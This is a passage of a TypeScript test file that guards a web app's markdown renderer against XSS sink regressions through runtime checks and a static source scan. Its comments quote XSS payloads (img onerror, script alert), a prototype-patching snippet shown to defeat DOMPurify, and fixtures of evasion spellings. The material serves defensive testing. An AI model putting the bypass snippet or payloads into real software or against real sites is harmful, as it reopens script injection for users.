    const out = renderMarkdown('- [x] done\n');
    assertNotContains(
      out,
      'onerror',
      'a renderer installed on the shared marked singleton reached renderMarkdown',
    );
    assertNotContains(
      out,
      '<img',
      'a renderer installed on the shared marked singleton reached renderMarkdown',
    );
    assertContains(out, '☑\uFE0E', "renderMarkdown's own checkbox renderer stopped being used");
  });
}

// ---------------------------------------------------------------------------
// 6. Sink binding. Everything above secures a function that nothing forces
//    anyone to call: drop the wrapper at either sink — `unsafeHTML(c.body)`
//    instead of `unsafeHTML(renderMarkdown(c.body))` — and every check above
//    still passes while the whole bug class is back.
//
//    Mechanism: a static scan of the source tree, not a rendering test. A
//    rendering test would be the stronger proof, but instantiating the two Lit
//    components needs custom elements, adopted stylesheets and the Shoelace and
//    gRPC imports they pull in, none of which this plain `node` runner has —
//    that is a vitest-and-a-component-harness change, which is the Phase 2
//    branch's job, not a six-file cleanup's. The static scan costs nothing, has
//    no dependencies, and catches the exact regression described. Its one real
//    weakness is the classic one for source scanning — passing vacuously because
//    it matched no files — so the file count and the sink count are both pinned
//    below, and locating the tree throws rather than returning empty.
//
//    Read the guarantees here narrowly, and read them as THREE mechanisms with
//    very different strength. They keep getting cited as one thing ("G1"), and
//    that conflation is what carried three rounds of evadable checks past
//    sign-off. They are named separately below and they fail with separately
//    worded messages.
//
//    (a) THE PER-FILE BINDING — closed world, and meant to be SOUND.
//        `sinkBindingViolations` holds each file in REQUIRED_SINKS to rules
//        about how `renderMarkdown` and `unsafeHTML` may be USED: imported
//        unaliased from the one module allowed to provide them, never re-bound
//        locally, and never named anywhere except immediately called. That is a
//        finite claim over an enumerated set of two files, so it can be
//        finished. Its bar is the amended criterion stated at the end of this
//        comment — innocent-looking regression, not an arbitrary committer.
//
//    (b) THE TREE-WIDE SCAN — open world, and a TRIPWIRE, NOT A PROOF.
//        BANNED_SINKS, the indirection ban and the call-site collection
//        enumerate spellings across all source files. A regex over source text
//        is a hand-rolled stand-in for the TypeScript module graph, and it
//        disagrees with the real language semantics on aliasing, re-export and
//        indirection: `unsafeHTML as raw` followed by `raw(x)` is the same sink
//        written in a form no `unsafeHTML(` pattern can see. Every review round
//        so far has found a spelling the previous one missed, and the next one
//        will too. A green result from (b) means "none of the listed forms is
//        present in the files that were scanned" — never "no raw sink exists".
//        Do not cite it as the latter; its failure messages will not let you.
//
//    (c) SANITIZER OWNERSHIP — closed world over an enumerated dependency list.
//        R8 and R9, see sanitizerOwnershipViolations. (a) proves the sink CALLS
//        the sanitizer. It does not prove the sanitizer still SANITIZES, and
//        that is a separate axis: two `DOMPurify.addHook` calls at module scope
//        in a sink file satisfied every rule in (a) and rendered
//        `<img src=x onerror=alert(1)><script>alert(2)</script>` raw. (c) denies
//        every file but the sanitizer the ability to name its dependencies.
//
//    Soundness therefore lives in (a) and (c), plus the follow-up issue for
//    type-aware lint (typescript-eslint over resolved symbols) and Trusted
//    Types. Those answer "does any expression in this program evaluate to the
//    raw directive" using the compiler's own scope analysis, which is the
//    question (b) is failing to ask. Extending (b) with more patterns is not a
//    route to (a).
//
//    SUNSET CLAUSE — CONDITIONAL ON #204 (the typescript-eslint AST rule).
//    A guard this size with no scheduled removal becomes permanent by default,
//    and half of it is a hand-rolled stand-in for something #204 does properly.
//    When #204 lands and is enforcing in CI, DELETE the tokenizer-dependent
//    subset rather than maintaining both:
//
//      `stripInertText`, `stripImportStatements`, and everything that depends on
//      them — R3, R4, R7, `directiveIndirectionOffenders`, `BANNED_SINKS`, and
//      their fixture tables.
//
//    Each of those exists only because a regex over source text cannot see the
//    module graph. A rule over resolved symbols can, so keeping both is paying
//    twice for the weaker answer, and every defect this file has recorded — V7,
//    V8, V14, F1, T2 — is a tokenizer defect, not a policy defect.
//
//    KEEP UNCONDITIONALLY: the behavioural half (sections 1-5 above, everything
//    that calls renderMarkdown). It pins the actual XSS boundary, it is the
//    highest value per line in this file, and #204 does not replace any of it.
//    Also keep R1, R2, R5, R6, R8 and R9 until the Phase 2 harness observes the
//    sanitizer's EFFECT, since those are about ownership and call shape rather
//    than about tokenizing.
//
//    WHAT THIS GUARD CLAIMS, AND WHAT IT DOES NOT
//    --------------------------------------------
//    The criterion this guard was originally built against — "no mutation of
//    the two REQUIRED_SINKS files can leave them rendering unsanitized while
//    the suite is green" — never named an adversary, and read literally it is
//    unsatisfiable by anything in this file. It demands a guard that holds
//    against someone who can land arbitrary code in those files, and that
//    person can also edit this guard. The amended claim:
//
//      For the two enumerated sink files, any change that leaves a raw-HTML
//      directive reachable UNDER A DIFFERENT NAME OR THROUGH A DIFFERENT CALL
//      SHAPE, where that change is VISIBLE IN THE SCANNED SOURCE VIEW (comments
//      and string literals blanked, templates and regex literals resolved),
//      must turn the suite red. Changes that preserve every name and call shape
//      while altering runtime EFFECT — prototype patching, global
//      reconfiguration, runtime-assembled references — are out of scope and are
//      routed to the Phase 2 harness.
//
//    An earlier wording of this said the guard defends against "innocent-looking
//    regression". That was withdrawn, and the reason is worth keeping:
//    innocent-looking is a property of the AUTHOR'S INTENT, not of the artifact.
//    It is not decidable from a diff, so it cannot adjudicate a future dispute,
//    which is the only job an exit criterion has. Is `const raw = unsafeHTML`
//    innocent-looking? Nobody writes that by accident either. Under the intent
//    wording, V10 below — a real bypass — could have been argued away as
//    "adversarial, it omits semicolons". Under the wording above it is
//    unambiguously a violation: the alias is a different name and it is visible
//    in the scanned view. The clause that does the work is NAME-AND-SHAPE
//    versus EFFECT, and it is operative rather than a footnote.
//
//    The list this replaces — aliasing, shadowing, re-homing, rebinding,
//    argument-shape drift, laundering through an unscanned file, and capture of
//    the sanitizer's own configuration — is still a fair summary of the axes,
//    with ONE QUALIFICATION that the old wording overclaimed. R8 defends capture
//    of the sanitizer's configuration only BY NAMING A MODULE SPECIFIER THE
//    SCANNER CAN SEE. It does not defend a bare specifier that no rule resolves,
//    it does not defend capture by effect (V25), and — found in round 6 — it did
//    not defend a SECOND PARAMETER on renderMarkdown, which is a configuration
//    channel into the sanitizer opened through the front door with no specifier
//    to match. That third gap is closed by the arity pin in `inputContract` and
//    by `sinkArgumentIsSanitized` rejecting a top-level comma; the first two
//    remain open and are recorded as such.
//
//    THE BOUNDARY OF THE TECHNIQUE: rules of this kind can own a NAME. They
//    cannot own an EFFECT. R8 could kill the `addHook` attack because the
//    attack had to NAME 'dompurify' and a rule can take that name away.
//
//    DO NOT LET THAT BOUNDARY ABSORB MORE THAN IT SHOULD. The arity gap was
//    INSIDE the technique's reach, not beyond it: R5 did not fail to own an
//    effect there, it failed to own a SHAPE it explicitly claimed to own, since
//    `sinkArgumentIsSanitized`'s own docstring said "the argument has to be the
//    call and only the call" and an argument list is part of a call. "We can
//    only own names" is a real limit and also the most convenient excuse
//    available in this file; check which one you are using. The known survivor
//    below is on the far side of the boundary for real, because it names
//    nothing:
//
//      const origRemoveAttribute = Element.prototype.removeAttribute;
//      Element.prototype.removeAttribute = function (name: string): void {
//        if (String(name).startsWith('on')) return;
//        origRemoveAttribute.call(this, name);
//      };
//      const origRemoveChild = Node.prototype.removeChild;
//      Node.prototype.removeChild = function <T extends Node>(child: T): T {
//        if (child && child.nodeName === 'SCRIPT') return child;
//        return origRemoveChild.call(this, child) as T;
//      };
//
//    Placed in a REQUIRED_SINKS file this leaves the suite fully green and is
//    runtime-verified to defeat the sanitizer — DOMPurify strips attributes
//    with `removeAttribute` and nodes with `removeChild`:
//
//      before: "<p><img src=\"x\"></p>\n"
//      after : "<p><img src=\"x\" onerror=\"alert(1)\"><script>alert(2)</script></p>\n"
//
//    This is KNOWN, ACCEPTED AND DOCUMENTED, not an oversight. It is recorded
//    as V25 in the mutation vector table — reports/dev-195-vectors.json, with
//    its runtime-verified before/after and the reason it is accepted — so the
//    next reviewer meets it as disclosed prior art rather than rediscovering it
//    and rating it High. The same table records the other disclosed
//    limitations: indirect eval, computed globalThis access, new Function, and
//    the unresolved non-relative specifier. Do not close V25 by banning
//    `.prototype` assignment: the equivalents are unbounded (Object.
//    defineProperty, Object.assign, Reflect.defineProperty, setPrototypeOf,
//    __proto__, and non-prototype globals such as
//    document.implementation.createHTMLDocument), so such a ban would fake
//    coverage rather than provide it.
//
//    Observing the EFFECT instead of the name is the only closure, and it
//    requires LOADING the two sink modules and re-asserting the sanitizer
//    afterwards. That needs the component graph compiled, which is the Phase 2
//    component harness. It is ROUTED THERE, not dropped: V23 (the addHook
//    capture) and V25 (the prototype patch) are that harness's acceptance
//    vectors.
// ---------------------------------------------------------------------------

/**
 * The two components that mirror attacker-controlled markdown into a shadow
 * root. These are named explicitly because the tree-wide assertions further
 * down cannot distinguish "this file still routes through renderMarkdown" from
 * "this file no longer matches my regex" — a sink rewritten into an unmatched
 * form leaves the case list rather than failing a check. Reading each file by
 * path converts that silence into a `readFileSync` throw.
 *
 * Update deliberately: adding a sink here without a corresponding component, or
 * removing one that still exists, is a change to what this suite guarantees.
 */
const REQUIRED_SINKS = [
  'src/components/inspector/ft-inspector-comments.ts',
  'src/components/inspector/ft-inspector-desc.ts',
];

/**
 * How many files mechanism (a) — the sound half of this guard — is closed over.
 *
 * THIS IS NOT A DUPLICATE OF `REQUIRED_SINKS.length`, AND IT IS NOT A STYLE
 * CHOICE. Every other consumer of that array derives from it, including the
 * check-total pin:
 *
 *   EXPECTED_CHECKS = EXPECTED_CHECK_CALL_SITES + (REQUIRED_SINKS.length - 1)
 *
 * The `REQUIRED_SINKS.length` term appears on both sides of that equation — the
 * loop that runs the per-file checks and the expression that predicts how many
 * ran — so deleting an entry moves both by one and cancels. Measured (C2-e):
 * dropping `ft-inspector-desc.ts` from the array, aliasing the directive with a
 * `u` escape, and rendering `this.description` raw was GREEN at 68 checks
 * with tsc clean. The derivation was itself a round-5 fix, for the opposite
 * defect of a hard-coded total needing an edit whenever a sink was added, and it
 * is kept — the counterfactual with the literal restored (CF-1) is red, so the
 * derivation is doing real work. What it cannot do is notice the array getting
 * SHORTER, because that is the input it is derived from.
 *
 * The scope of a closed-world guard is exactly the thing that must not be
 * derived from the guard, so it is pinned here as an independent literal and
 * asserted where the tree is first read. Update it in the same commit as
 * REQUIRED_SINKS, deliberately, when a component genuinely gains or loses a
 * markdown sink — never to make a red suite go green.
 *
 * (The escape in C2-e matters: R7, the escape ban, is the only per-file rule the
 * shrink removes that the tree-wide tripwire does not also carry. Without it the
 * same mutation is red — CF-2. That narrowness is why R7 is now promoted to the
 * tree-wide scan as well; see `escapeInCodeOffenders`.)
 */
const EXPECTED_REQUIRED_SINKS = 2;

/**
 * Exact number of files this guard scans: everything scannable under `src/`,
 * plus EXTRA_SCANNED_FILES. Pinned, not a floor: the previous floor of 10 sat
 * under an actual count of 50, so forty files could have stopped being scanned
 * with no signal. This is the G7 check-total
 * rationale applied one level down — update it deliberately when a source file
 * is added or removed, never to make a red suite go green.
 */
const EXPECTED_SOURCE_FILES = 51;

/** Walks up from this module to the directory containing `src/util/markdown.ts`. */
function findWebRoot(): string {
  let dir = dirname(fileURLToPath(import.meta.url));
  for (let i = 0; i < 8; i += 1) {
    try {
      statSync(join(dir, 'src', 'util', 'markdown.ts'));
      return dir;
    } catch {
      const parent = dirname(dir);
      if (parent === dir) break;
      dir = parent;
    }
  }
  throw new Error('could not locate the web source tree from ' + import.meta.url);
}

// Extensions that cannot hold a raw-HTML sink. Everything else under `src/` is
// scanned.
//
// This is deliberately a DENYLIST. The previous allowlist ('.ts', '.tsx', '.js',
// '.mjs', '.cjs') was written to be "wider than what the tree contains today",
// but it still missed `.mts`, `.cts` and `.jsx` — and that gap was worse than an
// ordinary miss, because the filter runs BEFORE `files` is built, so such a file
// did not move the file-count pin either. There was no signal of any kind.
// Inverting the predicate makes "scanned" the default for whatever module
// extension this project adopts next, which is the property the allowlist's
// comment always claimed but could not deliver. "Not scanned" is
// indistinguishable from "clean" in the results, so the set of unscanned things
// must be the set we can argue about, not the set we happened to list.
//
// `.html` IS NO LONGER ON THIS LIST (audit LOW-2). It was, on the reading that
// HTML is markup rather than code — but an HTML file that ships to the browser
// can carry an inline `<script>`, and `web/index.html` does.
//
// WHAT THIS HALF OF THE FIX IS ACTUALLY FOR, corrected after measuring it. The
// first version of this comment said index.html was invisible "twice over" and
// that "fixing either alone leaves it unscanned". That was wrong, and the
// mutation that was supposed to confirm it refuted it instead:
// EXTRA_SCANNED_FILES reads index.html BY EXPLICIT PATH, so it never passes
// through this filter at all. Putting `.html` back here leaves index.html fully
// scanned. The two halves are independent, not conjunctive.
//
// This half covers a DIFFERENT file: a `.html` under `src/`, of which there are
// none today. Measured, with one created for the purpose — an inline
// `innerHTML` sink in `src/legacy-widget.html` is red via the sink tripwire with
// `.html` off this list, and GREEN with it on. Green with no count signal
// either, because the filter runs before `files` is built: the "no signal of any
// kind" case described above, reproduced. index.html is covered by
// EXTRA_SCANNED_FILES alone.
const INERT_EXTENSIONS = [
  '.css', '.scss', '.json', '.svg', '.md', '.txt',
  '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.woff', '.woff2',
];

/**
 * Files that SHIP TO THE BROWSER but do not live under `src/`.
 *
 * Audit LOW-2. The tree-wide scan walks `src/`, which is a reasonable default
 * and is also not the same set as "code that reaches the user". `index.html` is
 * the application's entry document: it is served, it carries an inline
 * `<script>` today, and an `innerHTML` assignment or a `document.write` added to
 * that block would have been invisible to all three mechanisms here.
 *
 * Paths are web-root-relative and are read by explicit path, so deleting or
 * renaming one is a `readFileSync` throw rather than a silently shorter list —
 * the same reason REQUIRED_SINKS is a list of paths rather than a glob.
 *
 * WHAT THIS DOES NOT CLAIM. It does not make the tree-wide scan sound; nothing
 * does. It removes one specific blind spot that was reported, and the honest
 * generalisation is on the record instead of being quietly closed: the scanned
 * set is still "src/ plus a hand-maintained list", so anything shipped from
 * `public/`, from a Vite plugin, or from a second HTML entry point added later
 * is outside it until someone adds it here.
 */
const EXTRA_SCANNED_FILES = ['index.html'];

function isScannableSource(entry: string): boolean {
  // Test files are excluded so that this file may name the banned identifiers in
  // prose. That exclusion is also why a raw sink in a `*.test.ts` file is
  // invisible here; test files are not bundled into the production build, which
  // is the whole of the argument for accepting it.
  if (/\.test\.[cm]?[jt]sx?$/.test(entry)) return false;
  return !INERT_EXTENSIONS.some((ext) => entry.endsWith(ext));
}

function collectSourceFiles(dir: string, out: string[]): void {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      collectSourceFiles(full, out);
    } else if (isScannableSource(entry)) {
      out.push(full);
    }
  }
}

// ---------------------------------------------------------------------------
// Source views. Every scan below runs over a derived view of the file, never
// over its raw bytes.
//
// The reason is not tidiness. A guard that rejects correct code gets deleted,
// and the person most likely to trip this one is the next developer writing a
// comment that explains it. Before this change, all of the following turned the
// suite red, in production files, with no raw sink anywhere:
//
//   // SECURITY: never import unsafeHTML as something else.
//   // Do not use document.write( here; use lit templating.
//   const ADVICE = 'never do el.innerHTML = userInput';
//   <!-- renderMarkdown sanitizes with DOMPurify before this HTML is injected. -->
//
// The last one is not hypothetical: it is a real line in
// ft-inspector-desc.ts, and the per-file rules below cannot be stated as
// "renderMarkdown may only appear immediately called" until it is stripped.
// ---------------------------------------------------------------------------

/**
 * Blanks inert text — line comments, block comments, HTML comments inside lit
 * templates, and (optionally) the contents of quoted string literals —
 * replacing each character with a space and preserving every newline, so line
 * numbers in failure messages still point at the real source line.
 *
 * Template literals are NOT treated as strings: `html`…`` bodies are live code
 * in this codebase and contain the real sinks. The scanner tracks `${…}`
 * interpolations with a stack so that quotes inside template text (`title="…"`,
 * an apostrophe in prose) are not mistaken for string delimiters.
 *
 * REGEX LITERALS ARE TRACKED, and that is not a nicety. The first version of
 * this function did not track them, on the reasoning that misreading one would
 * "fail toward blanking real code, i.e. toward a missed detection rather than a
 * false positive". That reasoning was wrong, and mutation testing proved it: a
 * missed detection was exactly the goal, and blanking real code was the exploit.
 * Both of these rendered attacker markup raw at the live sink with the suite
 * green at 59/59, because everything after the `//` — including the alias
 * itself — vanished from the guard's view:
 *
 *   const proto = /^https:\/\//.source; const rawHtml = unsafeHTML;
 *   const sep = /[\/\/]/.source;        const rawHtml = unsafeHTML;
 *
 * A `/` is therefore resolved in order: `//` and `/*` are always comments (no
 * regex may begin with either), then a regex literal if the previous
 * significant token cannot end an expression, then division. Character classes
 * and backslash escapes are honoured while skipping the literal, and the body
 * is blanked — a regex can never be a directive alias, and `/innerHTML\s*=/` in
 * production code should not trip a sink pattern.
 *
 * REMAINING RESIDUE, recorded rather than hidden: because quoted strings are
 * blanked for the per-file view, a reference assembled at runtime —
 * `(0, eval)('unsafeHTML')`, `globalThis[k]`, `new Function(...)` — is invisible
 * to these rules. That is not a refactor anyone performs by accident, it is not
 * reachable without the reviewer seeing `eval` in a component, and closing it
 * needs the compiler rather than a scanner. It is the strongest argument in this
 * file for the type-aware-lint follow-up.
 */
function stripInertText(src: string, opts: { strings: boolean }): string {
  const out = src.split('');
  const blank = (from: number, to: number): void => {
    for (let i = from; i < to && i < out.length; i += 1) {
      if (out[i] !== '\n') out[i] = ' ';
    }
  };
  const modes: ('code' | 'template')[] = ['code'];
  const braces: number[] = [0];

  // Enough token context to tell a regex literal from a division operator: a
  // regex may only begin where an expression may begin.
  let prevSig = '';
  let prevWord = '';
  const noteToken = (ch: string): void => {
    if (/\s/.test(ch)) return;
    prevWord = /[A-Za-z0-9_$]/.test(ch) ? prevWord + ch : '';
    prevSig = ch;
  };
  const EXPR_START_CHARS = '(,=:[!&|?{};+-*%^~<>';
  const EXPR_START_WORDS = new Set([
    'return', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void',
    'case', 'do', 'else', 'yield', 'await', 'throw',
  ]);
  const regexMayStart = (): boolean =>
    prevSig === '' || EXPR_START_CHARS.includes(prevSig) || EXPR_START_WORDS.has(prevWord);

  // Returns the index just past the closing `/`, or -1 if this is not a regex
  // literal after all (unterminated before end of line).
  const endOfRegexLiteral = (start: number): number => {
    let j = start + 1;
    let inClass = false;
    while (j < src.length) {
      const ch = src[j];
      if (ch === '\\') { j += 2; continue; }
      if (ch === '\n') return -1;
      if (inClass) { if (ch === ']') inClass = false; j += 1; continue; }
      if (ch === '[') { inClass = true; j += 1; continue; }
      if (ch === '/') return j + 1;
      j += 1;
    }
    return -1;
  };

  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const d = src[i + 1];
    if (modes[modes.length - 1] === 'template') {
      if (c === '\\') { i += 2; continue; }
      if (c === '`') { modes.pop(); i += 1; continue; }
      if (c === '$' && d === '{') { modes.push('code'); braces.push(0); i += 2; continue; }
      if (c === '<' && src.startsWith('<!--', i)) {
        const end = src.indexOf('-->', i + 4);
        // An UNTERMINATED `<!--` blanks NOTHING, deliberately. This used to blank
        // to end of file, which handed any scanned component a four-character
        // way to hide the whole rest of itself from every tree-wide rule at
        // once: R8, R9, the indirection tripwire and BANNED_SINKS all saw
        // spaces. It is worse than the unterminated block comment recorded as
        // V14, because an unterminated `/*` is a TypeScript syntax error and
        // `tsc` is a second gate on it, whereas an unterminated `<!--` inside a
        // template literal is valid TypeScript that compiles clean. There is no
        // second gate.
        //
        // Failing toward "scan it" costs at most a false positive on prose
        // inside a comment somebody forgot to close — visible, local, and
        // fixable by closing the comment. Failing toward "blank it" costs the
        // file. Same choice `endOfRegexLiteral` already makes when it returns -1.
        if (end === -1) {
          i += 4;
          continue;
        }
        blank(i, end + 3);
        i = end + 3;
        continue;
      }
      i += 1;
      continue;
    }
    if (c === '/' && d === '/') {
      const end = src.indexOf('\n', i);
      const to = end === -1 ? src.length : end;
      blank(i, to);
      i = to;
      continue;
    }
    if (c === '/' && d === '*') {
      const end = src.indexOf('*/', i + 2);
      const to = end === -1 ? src.length : end + 2;
      blank(i, to);
      i = to;
      continue;
    }
    if (c === '/' && regexMayStart()) {
      const end = endOfRegexLiteral(i);
      if (end !== -1) {
        blank(i + 1, end - 1);
        noteToken(')'); // a completed regex literal ends an expression
        i = end;
        continue;
      }
    }
    if (c === "'" || c === '"') {
      let j = i + 1;
      while (j < src.length && src[j] !== c && src[j] !== '\n') {
        j += src[j] === '\\' ? 2 : 1;
      }
      if (opts.strings) blank(i + 1, j);
      noteToken(c);
      i = Math.min(j + 1, src.length);
      continue;
    }
    if (c === '`') { modes.push('template'); noteToken(c); i += 1; continue; }
    if (c === '{') { braces[braces.length - 1] += 1; noteToken(c); i += 1; continue; }
    if (c === '}') {
      if (braces[braces.length - 1] === 0 && modes.length > 1) {
        modes.pop();
        braces.pop();
      } else if (braces[braces.length - 1] > 0) {
        braces[braces.length - 1] -= 1;
      }
      noteToken(c);
      i += 1;
      continue;
    }
    noteToken(c);
    i += 1;
  }
  return out.join('');
}

/**
 * THERE IS NO PER-LINE OPT-OUT, AND THAT IS A DELIBERATE REMOVAL.
 *
 * A `// raw-sink-scan: ignore-line` marker used to blank its own line for the
 * tree-wide scans, on the argument that comment stripping already handles prose
 * and only a string literal legitimately naming a banned form needs an escape
 * hatch. The marker was defended as contained because "it is deliberately NOT
 * honoured by the per-file rules in `sinkBindingViolations`".
 *
 * That containment argument was scoped wrongly, in this workstream's signature
 * way: a property that holds for one consumer, stated as if it held for all. The
 * per-file rules run on the two REQUIRED_SINKS files ONLY. For the other 49
 * scanned files the tree-wide tripwire IS the whole guard — and it honoured the
 * marker. Two marker comments in a non-sink component (`inspector-shared-styles`)
 * were enough to re-export the raw directive under another name and import it
 * into a sink file with R1-R9 all green and `tsc` clean. R6 and R9 do not fire,
 * because the laundering file does resolve into the scanned set: it is scanned,
 * it is simply not sounded.
 *
 * The cost of removal is real and is accepted: a production string literal that
 * must name a banned form (an error message, a lint fixture) now turns the suite
 * red with no in-file escape. That is the same bargain mechanism (a) and R8
 * already make — disarming a rule that pins the security boundary must require
 * editing THIS file, where a reviewer sees it, not adding a comment to a
 * component. No file under `src/` needs such a string today, and a line still
 * carrying the old marker is pinned as a POSITIVE in BANNED_SINK_POSITIVES so
 * the marker cannot be quietly re-honoured.
 */

/**
 * Blanks whole `import … from '…'` statements (and side-effect imports), with or
 * without the terminating semicolon.
 *
 * THE PROPERTY IS "ONE IMPORT STATEMENT CANNOT SWALLOW THE NEXT", which is what
 * `[^;'"]` buys: the character class cannot cross a quote, so a match starting at
 * one `import` keyword can never run past that statement's own specifier to
 * reach a later `from '…'`. The previous wording — "`[^;]` cannot cross a
 * statement boundary" — was simply false, because `[^;]` matches newlines. An
 * import that merely omitted its semicolon extended forward to the next
 * `from '…';` and blanked everything in between, INCLUDING A VALUE ALIAS:
 *
 *   import { unsafeHTML } from 'lit/directives/unsafe-html.js'   <- no semicolon
 *   const rawHtml = unsafeHTML                                   <- swept away
 *   import { renderMarkdown } from '../../util/markdown.js';     <- swept to here
 *
 * That is V3, "the rule that generalises", defeated by deleting two semicolons,
 * and it defeated the per-file rules and the tree-wide tripwire at the same
 * time. It is pinned as V10 below. The mirror case is worse for this guard's
 * survival: a CORRECT semicolon-less file was REJECTED, with a message accusing
 * it of aliasing, and a guard that rejects correct code gets deleted.
 *
 * This defect was already diagnosed and fixed once, for the re-export regex in
 * `directiveIndirectionOffenders` ("`[^;]` matches newlines, so an adjacent
 * semicolon-less line used to be swept in"). It was never carried back here,
 * where it feeds R3, R4 and the tree-wide non-called-position rule.
 *
 * `;?` makes the terminator optional so an ASI-style import is blanked properly
 * rather than not at all. `await import('…')` still has no `from` and its
 * specifier is quoted, so a destructuring rename off a dynamic import is not
 * blanked; its `unsafeHTML` sits before the `import` keyword and survives
 * regardless.
 *
 * `(?!\s*[.(])` IS THE SAME DEFECT AGAIN, ONE KEYWORD FURTHER ALONG. Making the
 * terminator optional fixed the case where an import swallowed the next
 * statement, but `import` is not only a statement keyword: `import.meta` is an
 * EXPRESSION, it is legal mid-file, it does not need a semicolon, and it has no
 * specifier of its own for `[^;'"]` to stop against. So a match starting at the
 * `import` of `import.meta` runs forward to the NEXT statement's `from '…'` and
 * blanks everything in between — which is exactly the swallow this function
 * claims to have closed, re-entered through a token the fix did not consider:
 *
 *   const dev = import.meta.env.DEV          <- no semicolon, no specifier
 *   export const rawHtml = unsafeHTML        <- swept away
 *   export { css as _css } from 'lit';       <- swept to here
 *
 * That was green at 69 checks with `tsc` clean, in a NON-SINK file that then
 * re-exported the raw directive into a sink file. Measured both ways: deleting
 * only the `import.meta` line from the identical laundering block turns it red,
 * so `import.meta` is what does the work rather than the block's shape. The
 * negative lookahead makes this function treat `import` as a statement keyword
 * only, which is what its name claims. `import.meta` then survives into the
 * scanned view, where it is inert — no rule here matches it.
 *
 * AND ONCE MORE FOR `import(…)`, WHICH IS WHY THE LOOKAHEAD IS A CHARACTER
 * CLASS. The version that shipped in round 7 was `(?!\s*\.)`, and the docblock
 * alongside it claimed this function "names all three" of `import`'s
 * productions. IT NAMED TWO. `import(<non-literal>)` still started a statement
 * match, and it is the same swallow for the same reason `import.meta` was:
 *
 *   const spec = getSpec()                   <- no semicolon
 *   const dev = import(spec)                 <- no quoted specifier either
 *   const rawHtml = unsafeHTML               <- swept away
 *   export { css as _css } from 'lit';       <- swept to here
 *
 * A QUOTED specifier does not reproduce it — `import('lit')` stops the match at
 * its own quote, which is exactly the property `[^;'"]` was chosen for, and it
 * is why this production survived two rounds of looking at this function. The
 * specifier has to be a non-literal, so there is no quote in the span.
 *
 * Measured on this tree, with one-token attribution: the block above appended to
 * the real non-sink `src/util/format.ts` was GREEN 75/122 with `tsc` exit 0
 * under `(?!\s*\.)`, and RED under `(?!\s*[.(])`. Both controls were RED — the
 * identical block with `import.meta.env.DEV`, and the identical block with the
 * `import(spec)` line deleted — so the single token `import(` is what did the
 * work, not the block's shape. Pinned as the last entry of
 * INDIRECTION_EVASIONS.
 *
 * The general lesson, since this is now the FOURTH instance: every token this
 * function keys on must be checked against the OTHER grammatical productions
 * that token appears in, not only against the one being parsed. `import` has
 * three — statement, `import(…)` expression, `import.meta` expression — and the
 * lookahead now excludes both expression forms, so this function treats `import`
 * as a statement keyword only, which is what its name claims. Do not restate
 * that as "all three productions are handled" without checking it: that sentence
 * has now been written once when it was false.
 *
 * Both expression forms then survive into the scanned view, where they are inert
 * for the tokenizer's purposes — but `import(…)` is NOT inert for the guard as a
 * whole, because a non-literal specifier is unresolvable. That is R6b's job, and
 * R6b is enforced tree-wide; see `dynamicImportSpecifierOffenders`.
 */
function stripImportStatements(code: string): string {
  const wipe = (m: string): string => m.replace(/[^\n]/g, ' ');
  return code
    .replace(/\bimport\b(?!\s*[.(])[^;'"]*?\bfrom\b\s*(['"])[^'"]*\1\s*;?/g, wipe)
    .replace(/\bimport\s*(['"])[^'"]*\1\s*;?/g, wipe);
}

/**
 * Fixture base for the arity pin: a minimal `markdown.ts` the rule must accept.
 * The mutation tables below are anchored on its declaration line.
 */
const ARITY_SOUND_SOURCE = [
  "import DOMPurify from 'dompurify';",
  '// THIS FUNCTION TAKES EXACTLY ONE PARAMETER, AND THAT IS A SECURITY PROPERTY.',
  'export function renderMarkdown(md: string): string {',
  '  return DOMPurify.sanitize(md);',
  '}',
].join('\n');

const ARITY_DECL = 'export function renderMarkdown(md: string): string {';

/**
 * Every arity spelling that must be REJECTED. C7-e2, C7-g and C7-h are the three
 * that were measured GREEN at 69 checks with `tsc` clean against the round-6
 * version of this rule; the rest are forms the round-6 version did catch and
 * that must not regress while the rule is rewritten.
 */
const ARITY_EVASIONS: { label: string; replace: string }[] = [
  {
    label: 'C7-a defaulted second parameter',
    replace: 'export function renderMarkdown(md: string, opts: Record<string, unknown> = {}): string {',
  },
  {
    label: 'C7-b rest second parameter',
    replace: 'export function renderMarkdown(md: string, ...rest: unknown[]): string {',
  },
  {
    label: 'C7-c destructured defaulted second parameter',
    replace:
      'export function renderMarkdown(md: string, { inline }: { inline?: boolean } = {}): string {',
  },
  {
    label: 'C7-d optional second parameter',
    replace: 'export function renderMarkdown(md: string, opts?: { inline?: boolean }): string {',
  },
  {
    // Defeated the round-6 rule: `.exec` returned the first OVERLOAD SIGNATURE,
    // which is clean, and never examined the implementation.
    label: 'C7-e2 two overload signatures above a defaulted implementation',
    replace:
      'export function renderMarkdown(md: string): string;\n' +
      'export function renderMarkdown(md: string, opts: { inline?: boolean }): string;\n' +
      'export function renderMarkdown(md: string, opts: { inline?: boolean } = {}): string {',
  },
  {
    // Defeated the round-6 rule with no overloads at all: the scan read raw
    // bytes, so a comment quoting the old signature matched first.
    label: 'C7-g a comment quoting the old signature above a two-parameter implementation',
    replace:
      '// Historical signature, kept for the changelog:\n' +
      '//   export function renderMarkdown(md: string): string\n' +
      'export function renderMarkdown(md: string, opts: Record<string, unknown> = {}): string {',
  },
  {
    label: 'C7-h a string literal quoting the old signature',
    replace:
      "export const HISTORICAL_SIGNATURE = 'export function renderMarkdown(md: string): string';\n" +
      'export function renderMarkdown(md: string, opts: Record<string, unknown> = {}): string {',
  },
  {
    // One top-level parameter, and still a configuration channel — and its call
    // shape hides the comma from sinkArgumentIsSanitized.
    label: 'C7-i a destructured sole parameter',
    replace:
      'export function renderMarkdown({ md, inline }: { md: string; inline?: boolean }): string {',
  },
  {
    label: 'C7-j a rest sole parameter',
    replace: 'export function renderMarkdown(...md: string[]): string {',
  },
  {
    // The declaration disappears rather than widening. A scan that returns
    // "nothing to check" must not pass.
    label: 'C7-f rewritten as an arrow function assigned to a const',
    replace: 'export const renderMarkdown = (md: string, opts = {}): string => {',
  },
  {
    // The documented FALSE POSITIVE, pinned so that relaxing it is a deliberate
    // edit here rather than a silent one. See renderMarkdownArityViolation.
    label: 'C7-k a default on the sole parameter (deliberate false positive)',
    replace: "export function renderMarkdown(md: string = ''): string {",
  },
  {
    // FOUND IN ROUND 8, and it was LIVE: green at 78 checks / 122 assertions
    // with `tsc --noEmit` clean, against an implementation taking a real,
